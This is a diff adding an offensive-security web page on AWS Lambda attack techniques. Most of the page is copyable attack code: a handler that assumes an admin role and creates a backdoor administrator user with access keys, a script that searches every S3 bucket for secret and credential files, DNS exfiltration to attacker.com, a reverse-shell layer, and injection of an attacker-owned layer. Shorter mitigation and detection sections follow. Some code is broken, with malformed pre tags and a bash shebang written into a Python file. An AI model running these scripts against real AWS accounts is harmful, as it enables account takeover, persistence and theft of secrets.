@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lambda Attacks | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-high { background: rgba(255,136,0,0.2); color: #ff8800; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Cloud Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Cloud Security</a> / Lambda Attacks
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-high"><i class="fas fa-exclamation-triangle"></i> High Severity | T1526</span>
+      <h1>λ Lambda Attack Techniques</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1526</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>AWS Lambda</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Privilege Escalation</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Medium</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>AWS Lambda is a serverless compute service that can be exploited for privilege escalation, persistence, data exfiltration, and computational resource abuse when misconfigured or when combined with other IAM vulnerabilities.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why Lambda is a Target:</strong>
+        <ul>
+          <li><strong>Execution Role:</strong> Often has elevated IAM permissions</li>
+          <li><strong>Privilege Escalation:</strong> PassRole allows assuming higher-privilege roles</li>
+          <li><strong>Persistence:</strong> Cron triggers provide scheduled execution</li>
+          <li><strong>Data Access:</strong> Can read from S3, DynamoDB, RDS</li>
+          <li><strong>Stealth:</strong> Hard to detect malicious Lambda activity</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 2. ENUMERATION -->
+    <div class="content-section" id="enumeration">
+      <h2>🔍 Enumeration</h2>
+      
+      <p><strong>List Lambda Functions:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># List all functions
+aws lambda list-functions --region us-east-1
+
+# Get function details
+aws lambda get-function --function-name target-function
+
+# List function versions
+aws lambda list-versions-by-function --function-name target-function
+
+# List aliases
+aws lambda list-aliases --function-name target-function</pre>
+      </div>
+
+      <p><strong>Analyze Execution Role:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Get IAM role for function
+aws lambda get-function-configuration --function-name target \
+    --query 'Role' --output text
+
+# Assume the role
+aws iam simulate-principal-policy \
+    --policy-source-arn arn:aws:iam::123456789012:role/lambda-exec-role \
+    --action-names "*" --resource-arns "*"
+
+# List attached policies
+aws iam list-attached-role-policies --role-name lambda-exec-role</pre>
+      </div>
+
+      <p><strong>Check Triggers and Event Sources:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Get event source mappings
+aws lambda list-event-source-mappings --function-name target
+
+# Check S3 trigger configuration
+aws lambda get-function --function-name target \
+    --query 'Environment.Variables'
+
+# Check CloudWatch triggers
+aws events list-rules --region us-east-1
+aws events list-targets-by-rule --rule lambda-trigger</pre>
+      </div>
+    </div>
+
+    <!-- 3. PRIVILEGE ESCALATION -->
+    <div class="content-section" id="privesc">
+      <h2>🔓 Privilege Escalation via Lambda</h2>
+      
+      <p><strong>Technique 1: PassRole + Lambda Execution:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create malicious Lambda function
+zip -j payload.zip handler.py
+
+aws lambda create-function \
+    --function-name privesc-func \
+    --runtime python3.9 \
+    --handler handler.main \
+    --zip-file fileb://payload.zip \
+    --role arn:aws:iam::123456789012:role/lambda-exec-role
+
+# Invoke the function
+aws lambda invoke --function-name privesc-func output.txt
+
+# Or use event to trigger
+aws lambda invoke --function-name privesc-func \
+    --payload '{"action": "escalate"}' output.txt</pre>
+      </div>
+
+      <p><strong>Technique 2: Update Existing Function Code:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Download original function code
+aws lambda get-function --function-name legitimate-func \
+    --query 'Code.Location' --output text | xargs curl -o function.zip
+
+# Modify and update
+# Create malicious handler.py
+zip malicious.zip malicious.py
+
+aws lambda update-function-code \
+    --function-name legitimate-func \
+    --zip-file fileb://malicious.zip
+
+# Function will execute with its original role</pre>
+      </div>
+
+      <p><strong>Technique 3: Create Function with Admin Role:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If you have lambda:CreateFunction + iam:PassRole
+# Create function with admin role
+
+aws lambda create-function \
+    --function-name admin-func \
+    --runtime python3.9 \
+    --handler shell.main \
+    --zip-file fileb://shell.zip \
+    --role arn:aws:iam::123456789012:role/AdministratorAccess
+
+# Invoke to execute code with admin</pre>
+      </div>
+
+      <p><strong>Lambda Handler for Privilege Escalation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>import boto3
+import json
+
+def main(event, context):
+    # Get execution role credentials
+    sts = boto3.client('sts')
+    identity = sts.get_caller_identity()
+    
+    # Assume admin role
+    assume_role = boto3.client('sts')
+    response = assume_role.assume_role(
+        RoleArn='arn:aws:iam::123456789012:role/AdministratorAccess',
+        RoleSessionName='lambda-escalation'
+    )
+    
+    # Use admin credentials
+    access_key = response['Credentials']['AccessKeyId']
+    secret_key = response['Credentials']['SecretAccessKey']
+    session_token = response['Credentials']['SessionToken']
+    
+    # Exfiltrate or create backdoor
+    iam = boto3.client('iam',
+        aws_access_key_id=access_key,
+        aws_secret_access_key=secret_key,
+        aws_session_token=session_token
+    )
+    
+    # Create backdoor user
+    iam.create_user(UserName='backdoor_admin')
+    iam.attach_user_policy(
+        UserName='backdoor_admin',
+        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+    )
+    keys = iam.create_access_key(UserName='backdoor_admin')
+    
+    return {'status': 'exfiltrated', 'keys': keys}</pre>
+      </div>
+    </div>
+
+    <!-- 4. PERSISTENCE -->
+    <div class="content-section" id="persistence">
+      <h2>🎯 Persistence Mechanisms</h2>
+      
+      <p><strong>1. CloudWatch Event Trigger:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create recurring event trigger
+aws events put-rule --name "DailyLambdaRun" \
+    --schedule-expression "rate(1 day)" \
+    --state ENABLED
+
+aws lambda add-permission \
+    --function-name backdoor-func \
+    --action lambda:InvokeFunction \
+    --principal events.amazonaws.com \
+    --statement-id events-trigger \
+    --source-arn arn:aws:events:us-east-1:123456789012:rule/DailyLambdaRun
+
+aws events put-targets \
+    --rule DailyLambdaRun \
+    --targets Id=1,Arn=arn:aws:lambda:us-east-1:123456789012:function:backdoor-func</pre>
+      </div>
+
+      <p><strong>2. S3 Trigger Backdoor:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create Lambda triggered on S3 upload
+aws lambda create-function --function-name s3-monitor ...
+
+aws lambda add-permission \
+    --function-name s3-monitor \
+    --action lambda:InvokeFunction \
+    --principal s3.amazonaws.com \
+    --statement-id s3-trigger \
+    --source-arn arn:aws:s3:::target-bucket
+
+# S3 bucket notification
+aws s3api put-bucket-notification-configuration \
+    --bucket target-bucket \
+    --notification-configuration '{
+      "LambdaFunctionConfigurations": [{
+        "LambdaFunctionArn": "arn:aws:lambda:us-east-1:123456789012:function:s3-monitor",
+        "Events": ["s3:ObjectCreated:*"]
+      }]
+    }'</pre>
+      </div>
+
+      <p><strong>3. SNS Trigger:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Lambda triggered via SNS
+aws sns subscribe \
+    --topic-arn arn:aws:sns:us-east-1:123456789012:lambda-trigger \
+    --protocol lambda \
+    --notification-endpoint arn:aws:lambda:us-east-1:123456789012:function:backdoor-func
+
+# Any SNS message triggers Lambda</pre>
+      </div>
+    </div>
+
+    <!-- 5. DATA EXFILTRATION -->
+    <div class="content-section" id="exfiltration">
+      <h2>📤 Data Exfiltration</h2>
+      
+      <p><strong>Read from Connected Services:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <preimport boto3
+
+def main(event, context):
+    s3 = boto3.client('s3')
+    
+    # List buckets
+    buckets = s3.list_buckets()['Buckets']
+    
+    # Enumerate each bucket
+    for bucket in buckets:
+        name = bucket['Name']
+        try:
+            objects = s3.list_objects_v2(Bucket=name)
+            for obj in objects.get('Contents', []):
+                key = obj['Key']
+                # Download sensitive files
+                if any(x in key.lower() for x in ['secret', 'cred', 'config', '.env']):
+                    data = s3.get_object(Bucket=name, Key=key)
+                    content = data['Body'].read()
+                    # Exfiltrate via DNS
+        except Exception as e:
+            continue
+    
+    return {'status': 'done'}
+
+# Alternative: Exfiltrate via DNS
+import socket
+def exfil(data):
+    domain = f"{data.hex()}.attacker.com"
+    socket.gethostbyname(domain)</pre>
+      </div>
+
+      <p><strong>Lambda Environment Variables:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check for secrets in environment
+aws lambda get-function-configuration --function-name target \
+    --query 'Environment.Variables'
+
+# If you can update, inject secrets
+aws lambda update-function-configuration \
+    --function-name target \
+    --environment "Variables={AWS_ACCESS_KEY_ID=...,AWS_SECRET_ACCESS_KEY=...}"</pre>
+      </div>
+    </div>
+
+    <!-- 6. LAMBDA LAYERS -->
+    <div class="content-section" id="layers">
+      <h2>📦 Lambda Layers Exploitation</h2>
+      
+      <p><strong>Create Malicious Layer:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create layer with reverse shell
+mkdir layer
+echo '#!/bin/bash' > layer/python/reverse.py
+echo 'import socket,subprocess' >> layer/python/reverse.py
+# ... full shell code ...
+
+zip -r malicious-layer.zip layer/
+
+aws lambda publish-layer-version \
+    --layer-name backdoor-layer \
+    --zip-file fileb://malicious-layer.zip \
+    --compatible-runtimes python3.9 python3.10
+
+# Attach to function
+aws lambda update-function-configuration \
+    --function-name target-func \
+    --layers arn:aws:lambda:us-east-1:123456789012:layer:backdoor-layer:1</pre>
+      </div>
+
+      <p><strong>Inject into Existing Function:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre# If you have lambda:UpdateFunctionConfiguration
+# Add malicious layer
+aws lambda update-function-configuration \
+    --function-name legitimate-func \
+    --layers arn:aws:lambda:us-east-1:attacker:layer:evil:1
+
+# Function will load your layer code first</pre>
+      </div>
+    </div>
+
+    <!-- 7. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Secure Lambda Configuration:</strong>
+        <ul>
+          <li><strong>Least Privilege:</strong> Lambda roles should have minimal permissions</li>
+          <li><strong>No PassRole:</strong> Lambda roles should NOT have iam:PassRole</li>
+          <li><strong>VPC Isolation:</strong> Run Lambda in VPC with no internet access</li>
+          <li><strong>Encrypt Secrets:</strong> Use KMS for environment variables</li>
+          <li><strong>Code Signing:</strong> Enable for Lambda functions</li>
+          <li><strong>Disable outdated runtimes:</strong> Use latest versions</li>
+        </ul>
+      </div>
+
+      <p><strong>GuardDuty Coverage:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Findings to monitor
+- Persistence:Lambda/FunctionActivity
+- PrivilegeEscalation:Lambda/PassRoleInjection
+- DefenseEvasion:Lambda/DeleteActivity
+- Exfiltration:Lambda/RegionExfiltration</pre>
+      </div>
+    </div>
+
+    <!-- 8. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+
+      <p><strong>CloudTrail Queries:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre# New Lambda functions created
+fields @timestamp, userIdentity.userName, responseElements.functionName
+| filter eventName = "CreateFunction"
+| sort @timestamp desc
+
+# Function code updated
+fields @timestamp, userIdentity.userName, requestParameters.functionName
+| filter eventName = "UpdateFunctionCode"
+
+# New layers published
+fields @timestamp, userIdentity.userName, requestParameters.layerName
+| filter eventName = "PublishLayerVersion"
+
+# Function configuration changed
+fields @timestamp, userIdentity.userName, requestParameters.functionName
+| filter eventName = "UpdateFunctionConfiguration"
+| filter requestParameters.layers EXISTS</pre>
+      </div>
+
+      <p><strong>CloudWatch Alert Example:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre# Alert on unusual Lambda activity
+fields @timestamp, eventName, userIdentity.arn
+| filter (eventName like /CreateFunction|UpdateFunctionCode/) 
+and (userIdentity.arn not like /aws:lambda/)
+| sort @timestamp desc</pre>
+      </div>
+    </div>
+
+    <!-- 9. TOOLS -->
+    <div class="content-section" id="tools">
+      <h2>🛠️ Tools</h2>
+
+      <ul>
+        <li><strong>pacu:</strong> AWS exploitation framework with Lambda modules</li>
+        <li><strong>leaky:</strong> Find sensitive data in Lambda environment variables</li>
+        <li><strong>enumerate-iam:</strong> Enumerate Lambda execution role permissions</li>
+      </ul>
+
+      <p><strong>Pacu Lambda Module:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>cd pacu
+python3 pacu.py
+# load <session>
+# run lambda__enum
+# run lambda__privesc_scan</pre>
+      </div>
+    </div>
+
+    <!-- 10. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https:// RhinoSecurityLabs.com/blog-posts/aws-privilege-escalation-via-lambda/" target="_blank">Lambda Privesc</a></li>
+        <li><a href="https://www.youtube.com/watch?v=CPLdXNs7uI8" target="_blank">Lambda Attack Talk</a></li>
+        <li><a href="https://docs.aws.amazon.com/lambda/latest/dg/lambda-permissions.html" target="_blank">Lambda Permissions</a></li>
+        <li><a href="https://github.com/RhinoSecurityLabs/pacu" target="_blank">Pacu AWS Framework</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Cloud Security</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
